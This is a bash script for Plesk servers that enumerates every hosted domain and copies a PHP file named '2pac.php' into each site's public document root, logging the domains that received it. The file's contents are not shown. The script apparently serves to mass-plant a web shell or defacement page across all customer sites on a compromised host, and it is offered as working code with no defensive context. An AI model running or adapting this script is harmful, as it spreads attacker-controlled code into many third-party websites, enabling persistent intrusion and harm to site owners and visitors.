#!/bin/bash

# Define the file to upload
FILE_TO_UPLOAD="/2pac.php"
# File to log successfully uploaded domains
LOG_FILE="uploaded_domains.txt"

# Clear the log file if it exists
> $LOG_FILE

# Get a list of all domains
DOMAINS=$(plesk bin domain --list)

# Loop through each domain and upload the file
for DOMAIN in $DOMAINS; do
    echo "Checking domain: $DOMAIN"

    # Construct the expected document root path
    DOMAIN_PATH="/var/www/vhosts/$DOMAIN/httpdocs"

    if [ -d "$DOMAIN_PATH" ]; then
        # Upload the file to the document root
        cp $FILE_TO_UPLOAD "$DOMAIN_PATH/"
        echo "File uploaded to $DOMAIN_PATH/ for $DOMAIN"

        # Append the domain to the log file
        echo $DOMAIN >> $LOG_FILE
    else
        echo "Upload path for $DOMAIN does not exist"
    fi
done

echo "Upload process completed. Domains with successful uploads are saved in $LOG_FILE."
